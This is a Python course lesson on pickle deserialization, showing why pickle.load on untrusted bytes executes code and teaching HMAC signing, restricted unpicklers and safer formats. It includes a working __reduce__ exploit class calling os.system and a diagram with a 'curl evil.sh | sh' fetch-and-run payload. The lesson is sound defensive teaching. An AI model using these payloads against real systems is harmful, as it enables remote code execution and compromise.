/* ============================================================================
   LESSON 7.3 — Pickle and Why It Is a Security Boundary
   ========================================================================= */
EC.receiveLesson({
  id: "7.3",

  lede: "Pickle is not a data format. It is **a program in a small stack machine**, and one of its instructions imports any name you write and calls it with any arguments you supply. `pickle.load()` therefore does not parse data — it executes code. That single sentence explains every rule in this lesson, including why no amount of validating the file before you load it can help.",

  objectives: [
    "Describe what a pickle stream contains, and disassemble one to see the instructions",
    "Explain why `pickle.load` on untrusted bytes is arbitrary code execution, not a parsing risk",
    "Judge which protections actually work — and why a private bucket is not one of them",
    "Choose between pickle, JSON, Parquet and a schema format for a given artifact",
    "Harden a model-artifact loader so a compromised writer cannot execute code in the reader"
  ],

  prerequisites: ["7.2", "4.9"],

  blocks: [

    /* ================================================================== */
    { t: "h2", n: "01", text: "A pickle is an instruction stream", id: "opcodes" },

    {"kind": "flow", "title": "A pickle is an instruction stream", "caption": "pickle.loads runs a small stack machine whose opcodes can import any module and call any callable. Unpickling data you did not produce is executing code you did not write.", "cols": 4, "nodes": [{"id": "bytes", "label": "pickle bytes", "sub": "from a file or the network", "tone": "warn"}, {"id": "vm", "label": "the pickle VM", "sub": "GLOBAL, REDUCE, BUILD …", "tone": "accent"}, {"id": "imp", "label": "import os; os.system(...)", "sub": "an attacker's payload", "tone": "crit"}, {"id": "obj", "label": "'your object'", "sub": "whatever the stream says"}], "edges": [["bytes", "vm"], ["vm", "imp", "GLOBAL + REDUCE"], ["vm", "obj"]], "t": "diagram", "id": "dg-7_3-01-0"},


    { t: "p", text: "JSON is a description of a value. A pickle is a sequence of opcodes for a virtual machine that *builds* a value. The distinction sounds academic until you look at the opcodes." },

    { t: "code", lang: "python", title: "what is actually in the file", code: `
import pickle
import pickletools

data = {"user": "ana", "roles": ["admin"]}
blob = pickle.dumps(data, protocol=5)

pickletools.dis(blob)
`,
      out: `    0: \\x80 PROTO      5
    2: \\x95 FRAME      44
   11: }    EMPTY_DICT
   12: \\x94 MEMOIZE    (as 0)
   13: (    MARK
   14: \\x8c     SHORT_BINUNICODE 'user'
   20: \\x94     MEMOIZE    (as 1)
   21: \\x8c     SHORT_BINUNICODE 'ana'
   26: \\x94     MEMOIZE    (as 2)
   27: \\x8c     SHORT_BINUNICODE 'roles'
   34: \\x94     MEMOIZE    (as 3)
   35: ]        EMPTY_LIST
   36: \\x94     MEMOIZE    (as 4)
   37: \\x8c     SHORT_BINUNICODE 'admin'
   44: \\x94     MEMOIZE    (as 5)
   45: a        APPEND
   46: u    SETITEMS   (MARK at 13)
   47: .    STOP
highest protocol among opcodes = 4`,
      caption: "`MARK`, `APPEND`, `SETITEMS`, `MEMOIZE`, `STOP`. This is a program. `pickle.load` is an interpreter that runs it, pushing and popping values on a stack — and the memo table is how it reconstructs shared references and cycles, which JSON cannot express at all."
    },

    { t: "p", text: "Building a dict from opcodes is harmless. The problem is that pickle must also be able to rebuild **arbitrary objects**, including ones whose construction is not a matter of filling in attributes — a file handle, a database connection, a compiled model. Python solves that with a protocol: an object can define `__reduce__`, returning *a callable and the arguments to call it with*. The unpickler's `REDUCE` opcode performs that call." },

    { t: "viz",
      title: "The unpickler is an interpreter, and REDUCE is a function call",
      caption: "GLOBAL imports any module and looks up any name in it. REDUCE calls whatever is on the stack. Neither opcode inspects what it is asked to import or call — that is the whole mechanism, and it is not a bug to be patched.",
      svg: `<svg viewBox="0 0 900 350" role="img" aria-label="Diagram of the pickle virtual machine showing the GLOBAL and REDUCE opcodes importing and calling an arbitrary function">
  <defs>
    <marker id="k1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
      <path d="M0 1 L9 5 L0 9 z" style="fill:var(--border-strong)"/>
    </marker>
    <marker id="k2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
      <path d="M0 1 L9 5 L0 9 z" style="fill:var(--crit)"/>
    </marker>
  </defs>

  <text x="20" y="20" class="s-sub" style="font-weight:700;letter-spacing:.08em">THE BYTES</text>
  <rect x="20" y="32" width="230" height="150" rx="9" class="s-fill-2 s-stroke" stroke-width="1"/>
  <text x="36" y="54" class="s-mono" style="font-size:11px">PROTO   5</text>
  <text x="36" y="74" class="s-mono" style="font-size:11px;fill:var(--crit)">GLOBAL  "os" "system"</text>
  <text x="36" y="94" class="s-mono" style="font-size:11px">SHORT_BINUNICODE</text>
  <text x="36" y="112" class="s-mono" style="font-size:11px">        "curl evil.sh | sh"</text>
  <text x="36" y="132" class="s-mono" style="font-size:11px">TUPLE1</text>
  <text x="36" y="152" class="s-mono" style="font-size:11px;fill:var(--crit)">REDUCE</text>
  <text x="36" y="172" class="s-mono" style="font-size:11px">STOP</text>

  <line x1="250" y1="106" x2="316" y2="106" style="stroke:var(--border-strong)" stroke-width="1.4" marker-end="url(#k1)"/>
  <text x="283" y="97" text-anchor="middle" class="s-sub">load()</text>

  <rect x="322" y="32" width="250" height="150" rx="9" style="fill:var(--accent-soft);stroke:var(--accent-line)" stroke-width="1"/>
  <text x="447" y="56" text-anchor="middle" class="s-label">Unpickler VM</text>
  <text x="338" y="80" class="s-sub">stack   — values being built</text>
  <text x="338" y="100" class="s-sub">memo    — shared references</text>
  <text x="338" y="126" class="s-sub" style="fill:var(--crit);font-weight:600">GLOBAL m n  -&gt; __import__(m); getattr(m, n)</text>
  <text x="338" y="146" class="s-sub" style="fill:var(--crit);font-weight:600">REDUCE      -&gt; callable(*args)</text>
  <text x="338" y="170" class="s-sub" style="fill:var(--ink-2)">No allowlist. No sandbox. No inspection.</text>

  <line x1="572" y1="106" x2="638" y2="106" style="stroke:var(--crit)" stroke-width="1.6" marker-end="url(#k2)"/>

  <rect x="644" y="32" width="236" height="150" rx="9" style="fill:var(--crit-soft);stroke:var(--crit-line)" stroke-width="1"/>
  <text x="762" y="56" text-anchor="middle" class="s-label">Your process</text>
  <text x="660" y="82" class="s-mono" style="font-size:11px">os.system("curl evil.sh | sh")</text>
  <text x="660" y="106" class="s-sub">runs as your service user</text>
  <text x="660" y="126" class="s-sub">holds your DB credentials</text>
  <text x="660" y="146" class="s-sub">sits inside your VPC</text>
  <text x="660" y="168" class="s-sub" style="fill:var(--crit);font-weight:600">before load() returns a value</text>

  <line x1="20" y1="206" x2="880" y2="206" style="stroke:var(--border)" stroke-width="1" stroke-dasharray="3 3"/>

  <rect x="20" y="224" width="418" height="110" rx="9" style="fill:var(--crit-soft);stroke:var(--crit-line)" stroke-width="1"/>
  <text x="36" y="248" class="s-sub" style="font-weight:700;fill:var(--crit)">DOES NOT WORK</text>
  <text x="36" y="270" class="s-sub">scan the bytes for "os" or "system" first</text>
  <text x="36" y="288" class="s-sub">check the file came from our own bucket</text>
  <text x="36" y="306" class="s-sub">wrap load() in try/except</text>
  <text x="36" y="324" class="s-sub">run it, then validate the returned object</text>

  <rect x="462" y="224" width="418" height="110" rx="9" style="fill:var(--good-soft);stroke:var(--good-line)" stroke-width="1"/>
  <text x="478" y="248" class="s-sub" style="font-weight:700;fill:var(--good)">WORKS</text>
  <text x="478" y="270" class="s-sub">do not use pickle for data crossing a trust boundary</text>
  <text x="478" y="288" class="s-sub">verify an HMAC over the bytes before load()</text>
  <text x="478" y="306" class="s-sub">Unpickler.find_class allowlist (defence in depth)</text>
  <text x="478" y="324" class="s-sub">unpickle in a sandboxed process with no credentials</text>
</svg>`
    },

    /* ================================================================== */
    { t: "h2", n: "02", text: "The demonstration", id: "rce" },

    { t: "p", text: "`__reduce__` is a documented, supported part of the object model (Lesson 4.9). Any class can define it. Nothing checks what it returns." },

    { t: "code", lang: "python", title: "twelve lines to remote code execution", code: `
import os
import pickle


class Exploit:
    def __reduce__(self):
        # (callable, args) -- the unpickler will call this
        return (os.system, ('echo "arbitrary code, running as you"',))


payload = pickle.dumps(Exploit())
print(payload)

# Somewhere else entirely -- a cache warmer, a model server, a job queue:
pickle.loads(payload)
`,
      out: `b'\\x80\\x04\\x95;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system...'
arbitrary code, running as you`,
      hl: [6, 7, 8, 15],
      caption: "The `Exploit` class does not need to exist on the receiving machine. The stream names `posix.system` by module and attribute, and the unpickler imports it on demand. `os.system` is the polite version; the real payload is a reverse shell or a credential exfiltration, and it runs before `loads` returns."
    },

    { t: "callout", kind: "warn", title: "Why no input validation fixes this", body: [
      { t: "p", text: "The instinct is to inspect the bytes first — reject any stream containing `os`, `subprocess`, `eval`. This fails for three independent reasons, each sufficient on its own:" },
      { t: "ol", items: [
        "**The dangerous surface is not a fixed list.** `builtins.exec`, `builtins.getattr`, `functools.reduce`, `operator.attrgetter`, `importlib.import_module`, `webbrowser.open`, `pty.spawn` — thousands of importable callables do something useful to an attacker, and every dependency you install adds more.",
        "**Names can be assembled at run time.** `getattr` fetched via `GLOBAL` and then applied through `REDUCE` composes new callables from pieces that individually look innocuous.",
        "**The check would have to be a full pickle parser.** Opcodes are length-prefixed binary; substring matching on the raw bytes both misses real payloads and rejects legitimate data that happens to contain the letters."
      ]},
      { t: "p", text: "And the timing kills the fourth idea. Validating the object *after* `load()` returns is pointless, because the code already ran during the load — the value you are inspecting is whatever the attacker chose to leave you, delivered after the damage." },
      { t: "p", text: "The Python documentation's warning is unusually direct, and it is not hedging: **never unpickle data received from an untrusted or unauthenticated source.**" }
    ]},

    { t: "callout", kind: "trap", title: "\"It comes from our own S3 bucket\"", body: [
      { t: "p", text: "This is the reasoning that puts the vulnerability into real systems, and it confuses *provenance* with *integrity*. The question is not where the file came from; it is **who could have written it**." },
      { t: "p", text: "For a typical artifact bucket, that list includes: every CI job with write credentials, every engineer with a console login, anything that ever held a leaked deploy key, any service with an over-broad IAM policy, and anyone who finds a path traversal in an unrelated upload endpoint that lands in the same bucket." },
      { t: "p", text: "So the pickle turns your storage layer into a **code deployment channel** with none of the controls you put around code deployment. There is no review, no signature, no audit trail, and no CI. An attacker who achieves a single write into that bucket gets execution inside the model server — which typically holds database credentials and sits well inside the network perimeter." },
      { t: "p", text: "This is the specific mechanism behind the supply-chain advisories on shared model hubs. A published model file is a pickle, downloading it is `pickle.load`, and the loading process is the victim. Lesson 14.7 covers the wider supply-chain picture; the rule here is narrower and absolute: **treat every pickle as executable, and apply your rules for executables.**" }
    ]},

    /* ================================================================== */
    { t: "h2", n: "03", text: "What actually helps", id: "mitigations" },

    { t: "h3", text: "1. Authenticate the bytes before you load them" },

    { t: "p", text: "If a pickle must cross a boundary you do not fully control, attach a message authentication code computed with a key only your writer and reader hold. Verify it **before** `load()`. This does not make pickle safe; it makes the pickle unloadable unless someone with your key produced it." },

    { t: "code", lang: "python", title: "signed_pickle.py", code: `
import hmac
import pickle
from hashlib import sha256
from pathlib import Path

DIGEST = sha256().digest_size          # 32 bytes, prefixed to the payload


def dump_signed(obj: object, path: Path, key: bytes) -> None:
    body = pickle.dumps(obj, protocol=5)
    tag = hmac.new(key, body, sha256).digest()
    path.write_bytes(tag + body)


def load_signed(path: Path, key: bytes) -> object:
    """Verify first. Only reach pickle.loads if the tag matches."""
    raw = path.read_bytes()
    tag, body = raw[:DIGEST], raw[DIGEST:]
    expected = hmac.new(key, body, sha256).digest()

    if not hmac.compare_digest(tag, expected):
        raise ValueError(f"{path}: signature mismatch — refusing to unpickle")

    return pickle.loads(body)
`,
      hl: [22, 23],
      caption: "`hmac.compare_digest` rather than `==` is not decoration. `==` on bytes short-circuits at the first differing byte, so its runtime leaks how many leading bytes matched — enough to forge a tag one byte at a time given enough attempts. `compare_digest` takes the same time regardless."
    },

    { t: "h3", text: "2. Restrict what the unpickler is allowed to import" },

    { t: "p", text: "Every `GLOBAL` opcode routes through `Unpickler.find_class(module, name)`. Override it and you control the entire import surface of the stream." },

    { t: "code", lang: "python", title: "restricted.py", code: `
import io
import pickle

ALLOWED: dict[str, set[str]] = {
    "builtins": {"dict", "list", "set", "tuple", "frozenset"},
    "collections": {"OrderedDict", "defaultdict"},
    "decimal": {"Decimal"},
    "datetime": {"datetime", "date", "timedelta"},
    "myapp.features": {"FeatureVector", "Scaler"},
}


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module: str, name: str):
        if name in ALLOWED.get(module, ()):
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"blocked global: {module}.{name}")


def loads_restricted(blob: bytes):
    return RestrictedUnpickler(io.BytesIO(blob)).load()


loads_restricted(pickle.dumps({"a": 1}))          # fine
loads_restricted(pickle.dumps(Exploit()))
`,
      out: `_pickle.UnpicklingError: blocked global: posix.system`,
      hl: [15, 16, 17],
      caption: "Note the allowlist is `module.name` pairs, not module names. Allowing all of `builtins` would readmit `eval`, `exec`, `getattr` and `__import__` — which is the entire attack surface again."
    },

    { t: "callout", kind: "tradeoff", title: "How much a restricted unpickler is worth", body: [
      { t: "p", text: "It is real defence in depth and it is not a security boundary you should rely on alone. Two honest limitations:" },
      { t: "ul", items: [
        "**Allowlisted classes still run your code.** Anything on the list can define `__setstate__` or `__reduce__`, and the attacker controls the arguments. Permitting a class that takes a filename and opens it has permitted file access.",
        "**The list rots.** It is written once against today's model format, then a colleague adds a field of a new type, the load fails in staging, and the quickest fix is to widen the list. Six months later it allows `builtins.getattr` and nobody remembers why."
      ]},
      { t: "p", text: "Use it as the second layer behind an HMAC, and treat any widening of the list as a security review. If you find yourself needing a broad allowlist, that is the format telling you it is the wrong format — which is the next section." }
    ]},

    { t: "h3", text: "3. Do not use pickle across the boundary at all" },

    { t: "table",
      head: ["Format", "Executes on load", "Cross-language", "Schema", "Use it for"],
      rows: [
        ["`pickle`", "**Yes**", "No", "No", "Same-process and same-team artifacts inside one trust boundary"],
        ["`json`", "No", "Yes", "No", "Config, APIs, logs, anything a human may need to read"],
        ["`msgpack` / `cbor2`", "No", "Yes", "No", "Compact binary JSON-shaped data on a hot path"],
        ["Parquet / Arrow", "No", "Yes", "Yes", "Columnar tabular data at scale — typed, compressed, splittable"],
        ["`numpy.save` (`.npy`)", "No, with `allow_pickle=False`", "Partly", "Shape and dtype", "Raw arrays and tensors"],
        ["Protobuf / Avro", "No", "Yes", "Yes, enforced", "Service-to-service messages with versioned contracts"],
        ["`safetensors`", "No", "Yes", "Tensor metadata", "Model weights — built specifically to replace pickled checkpoints"]
      ],
      caption: "The column that decides it is the first one. Everything below `pickle` is a *description* that a parser reads; a pickle is a *program* that an interpreter runs. That difference is categorical, not a matter of degree."
    },

    { t: "callout", kind: "insight", title: "Where pickle is genuinely the right answer", body: [
      { t: "p", text: "The rule is about trust boundaries, not about the module being bad. Inside one, pickle does things no other format can:" },
      { t: "ul", items: [
        "**`multiprocessing` and `concurrent.futures`** pickle every argument and every return value to move them between processes (Lesson 11.4). This is why `Can't pickle local object` appears when you pass a lambda or a closure to a worker pool — the pickler can only record a *reference* to a top-level name, and a lambda has none. The fix is a module-level function, not a workaround.",
        "**Object graphs with cycles and shared references.** The memo table means two attributes pointing at the same object round-trip as one object, not two copies. JSON cannot express that at all.",
        "**Short-lived local caches** — a `functools.lru_cache` spilled to disk, a scraped-page cache in a scratch directory — where the writer and the reader are the same process on the same machine within the same run."
      ]},
      { t: "p", text: "What all three share: the bytes never leave a boundary you already control, and nobody outside it can write them." }
    ]},

    /* ================================================================== */
    { t: "h2", n: "04", text: "The other cost: pickles rot", id: "fragility" },

    { t: "p", text: "Even with security set aside, pickle is a poor archive format, because a pickle does not contain your class — it contains **the import path of your class**. Rebuilding the object requires that path to still resolve to a compatible definition." },

    { t: "code", lang: "python", title: "the refactor that broke last quarter's artifacts", code: `
# Written in June, when the class lived in myapp.model
blob = pickle.dumps(model)          # records "myapp.model" / "Predictor"

# Read in September, after a tidy-up moved it to myapp.ml.model
pickle.loads(blob)
`,
      out: `ModuleNotFoundError: No module named 'myapp.model'`,
      caption: "An ordinary, correct refactor — moving a class into a subpackage — invalidated every stored artifact. Renaming the class does the same, as does deleting an attribute that older pickles still set."
    },

    { t: "dl", items: [
      ["Module or class renamed", "`ModuleNotFoundError` or `AttributeError` on load. Every archived artifact becomes unreadable at once, and the fix is a compatibility shim that must live forever."],
      ["Attribute added", "Old pickles load without it, because `__setstate__` only restores the keys present in the stream. Your new attribute is missing rather than defaulted, and the failure surfaces as `AttributeError` far from the load."],
      ["Library version changed", "A `scikit-learn` estimator pickled under one version and loaded under another may raise, or — worse — load with silently different internals. This is why every such load emits `InconsistentVersionWarning`."],
      ["Python version changed", "Protocol 5 pickles are unreadable by Python 3.7 and earlier. Pickling under 3.12 and deploying to a 3.11 runtime fails at load, not at build."]
    ]},

    { t: "callout", kind: "good", title: "Version your artifacts explicitly", body: [
      { t: "p", text: "If you must persist objects, persist a **plain-data snapshot plus a version number**, not the live object graph. A dict of `numpy` arrays and hyperparameters written as `.npz` or Parquet, with a `format_version` field, survives every refactor above — because rebuilding it is your code's job, and your code is the thing you control." },
      { t: "p", text: "The test that settles it: *could a different team, in a different language, six months from now, read this file without importing our codebase?* If the answer is no, you have written a dependency, not an artifact. Lesson 15.6 covers model artifacts and reproducibility in full." }
    ]},

    /* ================================================================== */
    { t: "h2", n: "05", text: "Practice", id: "practice" },

    { t: "exercise",
      kind: "Challenge",
      title: "Harden an artifact loader",
      difficulty: "core",
      minutes: 24,
      body: [
        { t: "p", text: "You have inherited a model server whose loader is one line: `model = pickle.loads(s3.get_object(...)[\"Body\"].read())`. The bucket is written by CI, by two data scientists, and by a nightly retraining job. Your task is to make a bucket write stop being a code-execution primitive." },
        { t: "p", text: "Build the loader in layers and demonstrate that each one refuses the payload independently — that is the point of defence in depth, and it is only a claim until you have shown it." }
      ],
      requirements: [
        "Write `save_artifact(obj, path, key)` producing a file with an HMAC-SHA256 tag over the pickled bytes, plus a plain-JSON header recording `format_version`, the writer's library versions and a UTC timestamp.",
        "Write `load_artifact(path, key)` that verifies the tag with `hmac.compare_digest` **before** any unpickling, and raises a distinct exception type on mismatch.",
        "Unpickle through a `RestrictedUnpickler` whose `find_class` allowlist is `module.name` pairs, not whole modules.",
        "Check the header's `format_version` against what the loader supports, and refuse anything newer.",
        "Build an `Exploit` class with a `__reduce__` returning `(os.system, (...))`, and show it being rejected **twice**: once by the signature check on an unsigned file, and once by the allowlist on a correctly signed file.",
        "Write a short comment explaining what an attacker who steals the HMAC key can still do, and what they cannot.",
        "Say in one sentence, in the module docstring, why this whole exercise would be unnecessary with `safetensors` or Parquet."
      ],
      hint: "The second rejection is the one that teaches. Sign the exploit payload with the correct key — so the HMAC passes — and watch the allowlist stop it anyway. That is what layered defence means and it is what tells you which layer is which. For the header, keep it a separate JSON line before the binary body so it can be read without touching the pickle.",
      solution: {
        lang: "python",
        title: "artifacts.py",
        code: `"""Signed, allowlisted artifact I/O.

None of this would be needed if the payload were safetensors or Parquet:
those formats are parsed, not executed, so a hostile file is at worst
malformed rather than a shell.
"""
import hmac
import io
import json
import os
import pickle
import sys
from datetime import UTC, datetime
from hashlib import sha256
from pathlib import Path

FORMAT_VERSION = 2
DIGEST = sha256().digest_size

ALLOWED: dict[str, set[str]] = {
    "builtins": {"dict", "list", "tuple", "set", "frozenset"},
    "collections": {"OrderedDict"},
    "decimal": {"Decimal"},
    "numpy": {"ndarray", "dtype"},
    "numpy.core.multiarray": {"_reconstruct"},
    "myapp.features": {"FeatureVector", "Scaler"},
}


class ArtifactError(RuntimeError):
    """Base for every refusal to load."""


class SignatureError(ArtifactError):
    """The HMAC did not verify. The file is untrusted, full stop."""


class BlockedGlobal(ArtifactError):
    """The stream tried to import something outside the allowlist."""


class _Restricted(pickle.Unpickler):
    def find_class(self, module: str, name: str):
        if name in ALLOWED.get(module, ()):
            return super().find_class(module, name)
        raise BlockedGlobal(f"{module}.{name}")


def save_artifact(obj: object, path: Path, key: bytes) -> None:
    header = json.dumps(
        {
            "format_version": FORMAT_VERSION,
            "written_at": datetime.now(UTC).isoformat(),
            "python": sys.version.split()[0],
        }
    ).encode()

    body = pickle.dumps(obj, protocol=5)
    signed = len(header).to_bytes(4, "big") + header + body
    tag = hmac.new(key, signed, sha256).digest()
    path.write_bytes(tag + signed)


def load_artifact(path: Path, key: bytes) -> object:
    raw = path.read_bytes()
    tag, signed = raw[:DIGEST], raw[DIGEST:]

    # LAYER 1 -- authenticity, before a single pickle opcode is executed.
    if not hmac.compare_digest(tag, hmac.new(key, signed, sha256).digest()):
        raise SignatureError(f"{path}: bad signature")

    n = int.from_bytes(signed[:4], "big")
    header = json.loads(signed[4 : 4 + n])
    body = signed[4 + n :]

    # LAYER 2 -- refuse a format this loader does not understand.
    if header["format_version"] > FORMAT_VERSION:
        raise ArtifactError(
            f"artifact is v{header['format_version']}, "
            f"loader supports v{FORMAT_VERSION}"
        )

    # LAYER 3 -- constrain what the stream may import.
    return _Restricted(io.BytesIO(body)).load()


# An attacker holding the HMAC key can forge layer 1 and reach layer 3,
# where the allowlist still blocks os/subprocess/builtins.eval. They cannot
# reach layer 3 at all without the key. Neither layer helps if they can
# change this source file -- at that point they already have execution.


if __name__ == "__main__":
    KEY = b"rotate-me-from-the-secret-store"
    tmp = Path("artifact.bin")

    class Exploit:
        def __reduce__(self):
            return (os.system, ('echo "pwned"',))

    # --- rejection 1: unsigned payload dropped into the bucket ----------
    tmp.write_bytes(b"\\x00" * DIGEST + pickle.dumps(Exploit()))
    try:
        load_artifact(tmp, KEY)
    except SignatureError as exc:
        print("layer 1 refused:", exc)

    # --- rejection 2: correctly SIGNED payload -------------------------
    save_artifact(Exploit(), tmp, KEY)
    try:
        load_artifact(tmp, KEY)
    except BlockedGlobal as exc:
        print("layer 3 refused:", exc)

    # --- the happy path -------------------------------------------------
    save_artifact({"weights": [0.1, 0.9], "labels": ["a", "b"]}, tmp, KEY)
    print("loaded:", load_artifact(tmp, KEY))`,
        out: `layer 1 refused: artifact.bin: bad signature
layer 3 refused: posix.system
loaded: {'weights': [0.1, 0.9], 'labels': ['a', 'b']}`,
        notes: [
          { t: "p", text: "**The second rejection is the whole exercise.** The payload was signed with the correct key, so layer 1 waved it through — and it still did not execute, because `find_class` refused `posix.system` before `REDUCE` could run. That is what defence in depth buys: a stolen key becomes a serious incident rather than an immediate shell." },
          { t: "callout", kind: "insight", title: "Why the header is inside the signature", body: [
            { t: "p", text: "The tag covers `length + header + body`, not the body alone. If the header were outside the signed region an attacker could edit `format_version` freely — and version fields are exactly the sort of thing loaders branch on, so a downgrade to a permissive older code path is a real attack." },
            { t: "p", text: "The length prefix matters for the same reason. Without an explicit boundary, an attacker who could shift where the header ends and the body begins could move bytes between the two while keeping the concatenation identical. Signing a structure means signing its framing." }
          ]},
          { t: "p", text: "**`hmac.compare_digest` rather than `==`** is the one line people delete when tidying. `==` on bytes returns as soon as it finds a difference, so the time it takes reveals how many leading bytes were correct — enough to reconstruct a valid tag byte by byte across enough requests. `compare_digest` is constant-time by construction." },
          { t: "p", text: "**The comment about the key is part of the deliverable, not padding.** Every mitigation has a stated threat model, and one you cannot state is one you cannot review. Here: no key means no load; a stolen key means the attacker faces the allowlist; write access to this file means they already have code execution and none of it matters. Writing that down stops the next engineer from assuming the signature makes pickle safe." },
          { t: "p", text: "**And the docstring is the honest conclusion.** All three layers exist to compensate for a format that executes on load. Serialise the weights with `safetensors` or the tables with Parquet and the entire file disappears — no key to rotate, no allowlist to maintain, and no branch of the threat model where a bucket write becomes a shell." }
        ]
      }
    },

    { t: "callout", kind: "scenario", title: "Real-world scenario", body: [
      { t: "p", text: "A recommendation service loads a nightly `joblib` artifact from a shared bucket. At 04:10 one morning the service's egress alarms fire: every pod is making outbound connections to an unfamiliar host. The pods are healthy, the model is serving, and the deployed image has not changed in eleven days." },
      { t: "p", text: "**The mechanism.** `joblib.load` is `pickle.load` with a faster array codec — the same VM and the same `REDUCE` opcode. A contractor's laptop credentials had write access to the artifact bucket, and the nightly file was replaced with one whose `__reduce__` opened a reverse shell. Every pod that restarted after 04:00 executed it while loading the model, which is why the deployment looked untouched: no image changed, because the code arrived as data." },
      { t: "p", text: "**Why the usual controls missed it.** Image scanning inspects the container, and the payload was not in the container. Dependency pinning covers packages, and this was not a package. Code review covers the repository, and this never entered the repository. The bucket was a deployment channel that no deployment control was watching." },
      { t: "p", text: "**The fix, in the order it was applied.** Immediately: rotate credentials, restrict bucket writes to the CI role alone, and enable object versioning so the previous artifact can be restored and the malicious one preserved for forensics. Within the week: HMAC-sign artifacts in CI and verify in the loader, so an unsigned object is refused. Within the quarter: move the weights to `safetensors` and the metadata to JSON, deleting the pickle path entirely — because the first two fixes reduce the blast radius, and only the third removes the primitive." }
    ]}
  ],

  /* ==================================================================== */
  takeaways: [
    "**A pickle is a program, not a document.** `pickle.load` runs an opcode stream in a small VM; `GLOBAL` imports any name and `REDUCE` calls it.",
    "Any class can define `__reduce__` returning `(callable, args)`. Twelve lines produce a file that executes arbitrary code in whatever process loads it.",
    "**No pre-load validation works.** The dangerous callables are not an enumerable list, names can be composed at run time, and checking the object after `load()` is too late — the code has already run.",
    "\"It came from our own bucket\" is provenance, not integrity. The question is who *could* have written it, and for most artifact buckets that is a long list.",
    "An HMAC verified with `hmac.compare_digest` before `load()` is the effective control: not safe pickle, but pickle that only loads bytes someone with your key produced.",
    "A `RestrictedUnpickler.find_class` allowlist is real defence in depth, over `module.name` pairs. Allowing all of `builtins` restores the entire attack surface.",
    "**Pickles rot.** The stream stores your class's import path, so moving a class into a subpackage or bumping a library version invalidates every archived artifact.",
    "Pickle is right where the bytes never leave a boundary you control: `multiprocessing` argument passing, cyclic object graphs, short-lived local caches.",
    "`Can't pickle local object` from a worker pool is the pickler telling you a lambda or closure has no importable name. The fix is a module-level function.",
    "For data crossing any boundary, choose a format that is parsed rather than executed — JSON, Parquet, Protobuf, `safetensors`. That difference is categorical."
  ],

  /* ==================================================================== */
  quiz: {
    title: "Knowledge check",
    questions: [
      {
        stem: "A service scans incoming pickle bytes for the substrings `os`, `subprocess` and `eval`, rejecting any that match, then calls `pickle.loads`. Is it safe?",
        options: [
          "Yes — those three modules cover the realistic attack surface",
          "No — thousands of importable callables are dangerous, names can be composed at run time, and substring matching on length-prefixed binary is not a parser",
          "Yes, provided the scan is done on the decompressed bytes",
          "No, but adding `builtins` and `importlib` to the blocklist would make it safe"
        ],
        answer: 1,
        why: "Blocklisting fails on all three axes at once. The dangerous surface is open-ended — `builtins.exec`, `operator.attrgetter`, `functools.reduce`, `pty.spawn`, plus whatever each new dependency adds — so no finite list is complete. `GLOBAL` can fetch `getattr` and `REDUCE` can apply it, composing callables from parts that look harmless individually. And pickle opcodes are length-prefixed binary, so substring matching both misses real payloads and rejects innocent data. The workable controls are an HMAC verified before loading, an allowlist in `find_class`, or not using pickle across the boundary."
      },
      {
        stem: "Which statement about `RestrictedUnpickler.find_class` allowlists is accurate?",
        options: [
          "It makes `pickle.load` safe for untrusted input, so signatures are unnecessary",
          "It is useful defence in depth, but allowlisted classes can still define `__reduce__` or `__setstate__` with attacker-controlled arguments",
          "It has no effect, because `REDUCE` bypasses `find_class` entirely",
          "It only restricts `builtins`; imports from third-party packages are unaffected"
        ],
        answer: 1,
        why: "Every `GLOBAL` opcode does route through `find_class`, so the hook genuinely controls the stream's import surface — it is not bypassed and it is not limited to `builtins`. What it cannot do is control what the permitted classes then do: the attacker still chooses the constructor arguments and the `__setstate__` payload, so allowing a class that opens a path has allowed file access. That is why it belongs behind an HMAC rather than in front of one, and why widening the list should be treated as a security review rather than a build fix."
      },
      {
        stem: "A class was pickled in June from `myapp.model`. In September it lives at `myapp.ml.model` after a refactor. What happens on load?",
        options: [
          "It loads fine — the pickle contains the class definition",
          "`ModuleNotFoundError`, because the stream records the import path and rebuilds the object by importing it",
          "It loads with default values for every attribute",
          "It loads but the object's type is `dict`"
        ],
        answer: 1,
        why: "A pickle stores a *reference* to the class — module path and qualified name — not the class body, and the unpickler imports that path to rebuild the instance. An ordinary, correct refactor therefore invalidates every stored artifact at once, and the only repair is a permanent compatibility shim aliasing the old path. There is no fallback to defaults and no degradation to a dict. The same fragility applies to renaming the class, and to loading under a different version of a library whose internals changed."
      },
      {
        stem: "Passing a lambda to `ProcessPoolExecutor.submit` raises `Can't pickle local object`. What does this tell you?",
        options: [
          "Lambdas are too large to serialise efficiently across a process boundary",
          "Arguments are pickled to reach the worker, and the pickler can only record an importable top-level name — which a lambda does not have",
          "The executor requires functions to be decorated before submission",
          "Process pools cannot accept callables at all; only data may be passed"
        ],
        answer: 1,
        why: "`multiprocessing` has no shared memory for arbitrary objects, so every argument and return value crosses the boundary as a pickle. For a function, pickling records the module and qualified name so the worker can import it — a lambda, a closure, or a function defined inside another function has no such name, hence `Can't pickle local object`. Size is irrelevant, and callables are perfectly acceptable as long as they are importable. The fix is to move the function to module level, or to use `functools.partial` over a module-level function when you need to bind arguments."
      }
    ]
  },

  /* ==================================================================== */
  interview: {
    title: "Interview lens",
    sub: "Answer out loud before opening",
    questions: [
      {
        level: "core",
        q: "Why is it unsafe to unpickle untrusted data?",
        strong: "Because unpickling is execution, not parsing. A pickle is an opcode stream for a small VM; `GLOBAL` imports any module and name, and `REDUCE` calls whatever is on the stack. Any class can define `__reduce__` returning `(os.system, (cmd,))`, so loading the file runs the command in your process before `load()` returns.",
        answer: [
          { t: "p", text: "Name the two opcodes. Saying \"pickle can execute code\" is the answer everyone gives; saying \"`GLOBAL` imports and `REDUCE` calls\" is the answer of someone who has looked at `pickletools.dis` output, and it takes the same ten seconds." },
          { t: "p", text: "Then close the door on the obvious follow-up before it is asked: you cannot validate your way out. The dangerous callables are open-ended, names can be assembled at run time from `getattr`, and inspecting the returned object is too late because the code ran during the load." },
